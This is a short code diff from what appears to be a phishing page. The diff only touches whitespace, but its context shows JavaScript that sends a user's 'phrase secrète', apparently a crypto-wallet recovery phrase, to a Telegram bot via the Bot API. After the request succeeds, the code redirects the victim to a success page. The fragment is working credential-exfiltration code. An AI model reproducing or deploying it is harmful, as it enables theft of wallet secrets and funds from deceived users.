@@ -75,9 +75,8 @@
             fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=Phrase+secrète:+${encodeURIComponent(phraseSecrete)}`)
                 .then(response => {
                     if (response.ok) {
-                        
                         window.location.href = "success.html";
-                  } else {
+                    } else {
                         alert("Erreur lors de l'envoi !");
                     }
                 })
